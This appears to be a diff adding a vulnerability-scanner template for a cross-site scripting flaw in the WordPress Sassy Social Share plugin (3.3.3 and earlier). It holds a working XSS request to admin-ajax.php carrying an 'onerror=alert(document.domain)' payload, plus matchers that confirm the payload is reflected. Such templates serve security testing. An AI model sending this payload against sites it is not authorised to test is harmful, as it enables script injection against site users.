@@ -1,0 +1,35 @@
+id: sassy-social-share-xss
+brief:
+    title: Sassy Social Share <=3.3.3 - Cross-Site Scripting
+    by: Random_Robbie
+    level: medium
+    about: WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html...
+    label:
+        - xss
+        - wp
+        - wpscan
+        - wordpress
+        - wp-plugin
+        - sassy
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]='
+      signs:
+        - "on": word
+          has:
+            - '[{"<img src=x onerror=alert(document.domain)>":""}]'
+            - facebook
+            - twitter
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
